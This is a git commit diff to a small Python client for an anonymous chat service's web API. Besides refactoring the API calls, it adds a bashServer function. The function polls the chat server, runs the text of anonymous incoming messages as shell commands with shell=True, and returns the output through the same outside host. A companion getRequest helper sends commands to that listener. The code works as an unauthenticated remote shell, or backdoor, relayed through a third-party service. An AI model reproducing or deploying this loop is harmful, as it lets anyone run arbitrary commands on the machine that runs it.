94e0b7e9d90bb775ed56032e2a1c8f7ca001e9e0
GreyAlien502 <greyalien502@gmail.com>
2015-07-12 00:01:09 -0400

    new commands

--- basiccommands.py
+++ basiccommands.py
@@ -1,11 +1,33 @@
 import urllib.request
 import json
 
-def login(ID=''):
-	return json.loads(urllib.request.urlopen('http://ec.androiddown.com/chat/app.php?cmd=login&id='+ID+'&plat=iphone').read().decode('UTF-8'))
-def keep(ID=''):
-	return json.loads(urllib.request.urlopen('http://ec.androiddown.com/chat/app.php?cmd=keep&id='+ID+'&plat=iphone').read().decode('UTF-8'))
+def __get(options):
+	return json.loads(urllib.request.urlopen('http://ec.androiddown.com/chat/app.php?'+urllib.parse.urlencode(options)).read().decode('UTF-8'))
+
+def login(ID=None):
+	options = {'cmd':'login'}
+	if ID != None:
+		options.update({'id':ID})
+	return __get(options)
+def keep(ID=None):
+	options = {'cmd':'keep'}
+	if ID != None:
+		options.update({'id':ID})
+	return __get(options)
 def disconnect(ID='',to=''):
-	return json.loads(urllib.request.urlopen('http://ec.androiddown.com/chat/app.php?cmd=disconnect&id='+ID+'&to='+to+'&plat=iphone').read().decode('UTF-8'))
-def chat(ID='',to='',message=''):
-	return json.loads(urllib.request.urlopen('http://ec.androiddown.com/chat/app.php?cmd=chat&id='+ID+'&to='+to+'&content='+message+'&plat=iphone').read().decode('UTF-8'))
+	options = {'cmd':'disconnect'}
+	if ID != None:
+		options.update({'id':ID})
+	if to != None:
+		options.update({'to':to})
+	return __get(options)
+def chat(ID=None,to=None,message=None):
+	options = {'cmd':'chat'}
+	if ID != None:
+		options.update({'id':ID})
+	if to != None:
+		options.update({'to':to})
+	if message != None:
+		options.update({'content':message})
+	return __get(options)
+	
--- commands.py
+++ commands.py
@@ -1,3 +1,5 @@
+import subprocess as sub
+import time
 import basiccommands as base
 
 def getResponse(ID):
@@ -9,15 +11,14 @@ def getResponse(ID):
 def connect(ID1,ID2):
 	origin = ''
 	while origin != ID2:
+		base.disconnect(ID2)
 		base.login(ID1)
 		base.login(ID2)
-		connection = False
-		while connection == False:
-			eventlecian=getResponse(ID1)['events']
-			for event in eventlecian:
-				if event['type'] == 'connected':
-					connection = True
-					origin = event['from']
+		eventlecian=getResponse(ID1)['events']
+		for event in eventlecian:
+			print(event)
+			if event['type'] == 'connected':
+				origin = event['from']
 
 def attend(ID,pause=1):
 	while True:
@@ -29,3 +30,38 @@ def connectAll(baseID):
 	while True:
 		base.login(baseID+str(i))
 		i = i +1
+
+
+def bashServer(baseID,pause=1):
+	cat = baseID+"_cat"
+	hat = baseID+"_hat"
+	connect(cat,hat)
+	while True:
+		base.chat(hat,cat,"Look at me NOW!")
+		base.keep(cat)
+		response = base.keep(hat)
+		if 'events' in response:
+			for event in response['events']:
+				print('e')
+				print(event)
+				if event['type'] == 'connected':
+					1
+				elif event['type'] == 'disconnected':
+					connect(cat,hat)
+				elif event['type'] == 'msg':
+					if event['from'] == None:
+						name = event['content'].splitlines()[0]
+						command = '\n'.join(event['content'].splitlines()[1:])
+						try:
+							stdoutdata = sub.check_output(command,shell=True)
+							output = stdoutdata.decode('ascii', 'ignore')
+						except:
+							output = 'ERROR'
+						base.chat(None,name,output)
+				elif event['type'] == 'question':
+					1
+		time.sleep(pause)
+
+def getRequest(ID,target,request):
+	base.chat(None,target,ID+'\n'+request)
+	return getResponse(ID)['events'][0]['content']
